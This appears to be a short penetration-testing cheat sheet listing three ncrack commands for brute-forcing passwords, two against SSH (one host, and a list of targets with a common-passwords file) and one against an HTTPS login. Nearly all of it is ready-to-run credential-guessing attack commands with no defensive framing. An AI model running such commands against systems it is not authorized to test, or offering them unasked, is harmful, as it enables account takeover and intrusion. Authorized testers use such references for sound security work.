# Brute Force - Services

```
ncrack -u user -P password_list.txt -p ssh 192.168.1.1
```

Run SSH brute force on a single host with password list

```
ncrack -v --user <user> --pass "SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"  -p ssh -iL targets.txt
```

Run SSH brute force on targets from a list with password list of common ssh passwords

```
ncrack --user admin -P passwords.txt https://192.168.1.1:443
```

Brute force HTTP(S) with password list and single user
